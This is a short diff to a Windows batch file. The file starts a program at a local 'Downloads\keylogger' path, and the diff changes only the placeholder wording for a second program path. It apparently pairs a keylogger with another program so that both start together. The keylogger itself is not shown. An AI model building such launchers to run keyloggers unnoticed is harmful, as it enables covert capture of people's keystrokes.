@@ -1,4 +1,4 @@
 @echo off
 
 start "" "C:\Users\Suriyaa\Downloads\keylogger"
-start "" "<put a program .exe path here>"
+start "" "<paste the path of a program here>"
